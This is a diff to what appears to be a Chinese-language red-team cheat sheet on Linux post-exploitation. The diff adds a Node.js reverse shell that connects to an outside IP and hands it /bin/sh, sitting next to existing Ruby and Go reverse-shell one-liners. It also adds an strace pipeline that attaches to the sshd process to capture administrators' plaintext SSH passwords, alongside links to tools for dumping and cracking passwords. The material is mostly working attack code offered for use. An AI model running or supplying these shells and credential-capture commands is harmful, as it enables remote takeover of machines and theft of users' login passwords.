@@ -156,6 +156,27 @@ ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.ge
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.0.0.1:4242");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 ```
 
+**lambda Node.js**
+```js
+vim shell.js
+
+(function(){
+    var net=require("net"),
+    cp = require("child_process"),
+    sh =  cp.spawn("/bin/sh",[]);
+    var client = new net.Socket();
+    client.connect(8888,"1.1.1.1",function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/;
+})();
+```
+```bash
+node shell.js
+```
+
 **java**
 ```java
 r = Runtime.getRuntime()
@@ -217,7 +238,7 @@ strings reverse.war | grep jsp # in order to get the name of the file
 
 ---
 
-# 口令破解
+# 认证
 
 **文章**
 - [How to Crack Shadow Hashes After Getting Root on a Linux System](https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/)
@@ -226,3 +247,16 @@ strings reverse.war | grep jsp # in order to get the name of the file
 **工具**
 - [huntergregal/mimipenguin](https://github.com/huntergregal/mimipenguin) - 从当前 Linux 用户转储登录密码的工具
 - [Hashcat](../../安全工具/Hashcat.md#爆破shadow文件)
+
+**口令抓取**
+
+当我们拿下 windows 机器时可以通过抓内存中的密码进行横向，但 linux 却不可能抓到内存中的密码，但是 Debian 系列下的 linux 系统可以通过监听 sshd 进程的数据抓取出明文密码，比如你拿下了一台管理员机器，上面由 xshell，你可以手动开一个监听，在开一个登录，监听的窗口上就抓出密码了
+```bash
+strace -xx -fp `cat /var/run/sshd.pid` 2>&1| grep --line-buffered -P 'write\(\d, "\\x00' | perl -lne '$|++; @F=/"\s*([^"]+)\s*"/g;for (@F){tr/\\x//d}; print for @F'|grep --line-buffered -oP '.{8}\K([2-7][0-9a-f])*$'|grep --line-buffered -v '^64$'|perl -pe 's/([0-9a-f]{2})/chr hex $1/gie'
+```
+
+实测 kali、ubuntu 都可以，centos 不行
+
+![](../../../../assets/img/Security/RedTeam/OS安全/Linux安全/1.png)
+
+![](../../../../assets/img/Security/RedTeam/OS安全/Linux安全/2.png)
